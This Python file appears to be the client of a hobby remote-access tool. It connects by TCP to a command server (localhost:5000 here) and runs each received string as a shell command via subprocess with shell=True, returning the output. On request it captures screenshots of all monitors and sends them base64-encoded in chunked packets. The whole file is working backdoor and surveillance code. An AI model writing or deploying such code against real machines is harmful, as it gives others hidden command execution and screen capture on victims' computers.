import socket
import subprocess
import select
import threading
from datetime import datetime
import os
import base64
import textwrap

import numpy as np
from mss import mss # Multiple ScreenShot
# https://docs.python.org/3/library/socketserver.html#socketserver-tcpserver-example

# See the select section : https://docs.python.org/3/howto/sockets.html#socket-howto 
def is_socket_closed(sock: socket.socket) -> bool:
    try:
        # Check if the socket is still open by looking at the file descriptor
        if sock.fileno() == -1:
            return True
        readable, _, _ = select.select([sock], [], [], 0)
        return readable
    except (ValueError, OSError):
            return True


def send_data(sock: socket.socket, msg):
    if is_socket_closed(sock):
        print('Connection aborted (not in the whitelist)')
        return
    try:            
        # Send data to the server
        data = packet_crafting(msg)
        for packet in data:
            sock.sendall(packet) 

    except ConnectionResetError:
        print('The server closed the connection')


def packet_crafting(msg: str):
    data_size = len(msg) + 4 # Plus the header
    packets = []
    if (data_size > 8192) :
        packets = img_to_packets(msg)
    
    else :
        packet_size = int((np.ceil(data_size/1024)*1024))
        msg_encoded = msg.encode('utf-8')
        header_encoded = packet_size.to_bytes(4, 'little')
        packet = header_encoded + msg_encoded
        # print(f'Header : {packet_size}')
        # print(f'Packet size : {len(packet)} - Crafted packet : {packet}')
        packets = [packet]

    return packets

# REFACTOR : fusion the header part
def img_to_packets(img_base64):
    packets = []
    string_delim = '<START' + img_base64 + 'END>'

    chunks = textwrap.wrap(string_delim, 8188) # 8188 + 4 = 8192
    for chunk in chunks:
        header = 8192 
        header_encoded = header.to_bytes(4, 'little')
        packet = header_encoded + chunk.encode('utf-8')
        packets.append(packet)

    return packets

def b64_to_txt(b64):
    with open('img_b64.txt', 'wb') as fs:
        fs.write(b64)

def send_screenshot(sock: socket.socket):
    with mss() as sct:
        sct.compression_level = 9 # max compression = +- 50 000 bytes file
        time_stamp = datetime.today().strftime('%Y-%m-%d_%HH%M')
        img_path = f'./screenshots/{time_stamp}.jpg' # filename = "./screenshots/2024-10-23_21H07.jng"
        for filename in sct.save(mon=-1, output=img_path): #-1 : fusion of all monitor
            print(filename)

        file_stats = os.stat(filename)
        print(f'File Size in Bytes is {file_stats.st_size}')

        # Img to base64 str 
        with open(img_path, 'rb') as img_file:
            data = base64.b64encode(img_file.read())
            string_chunking = data.decode('utf-8')
            b64_to_txt(data)

            send_data(sock, string_chunking)


def get_data(sock: socket.socket):
    try: 
        res = sock.recv(1024).decode('utf-8')
        print(f'Server response : {res}')
        if res == 'screenshot':
            send_screenshot(sock)
        elif res != 'Alive ping back received':
            command = res.split(' ')
            res = exec_command(command)
            send_data(sock, res) # Returning command output
    except socket.timeout:
        print("Timeout, no response from server")
    except ConnectionAbortedError :
        pass # local closing


def exec_command(command):
    """ example : command = ['powershell', 'start', 'brave', 'www.google.com']"""
    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    output = result.stdout or result.stderr
    if output:
        print(output)
    return output


def listen_for_commands(sock : socket.socket):
    try:            
        # socket_closed = False
        while True :
            print('Listening for inc data')
            get_data(sock)
            if is_socket_closed(sock):
                break

    except ConnectionResetError:
        print('The server closed the connection')
    finally:
        print('Connection closed')


if __name__ == '__main__':
    HOST, PORT = 'localhost', 5000

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: # Conect with TCP
        try: 
            sock.connect((HOST, PORT))
            print(f'Connected @ : {sock.getpeername()}')
            send_data(sock, 'First connection ping')

            sock_thread = threading.Thread(target=listen_for_commands, args=(sock,))
            sock_thread.daemon = True  # Set the thread as a daemon so it doesn't block exit
            sock_thread.start()

            try:
                while sock_thread.is_alive():
                    sock_thread.join(timeout=1)  # Unblocking the main Thread
            except KeyboardInterrupt:
                print('Client terminated by user (Ctrl+C)')
                sock.close()
                sock_thread.join()
                # print(f"Threads : {threading.active_count()}")

        except ConnectionRefusedError:
            print('Connection refused by the host (server might be down or unreachable)')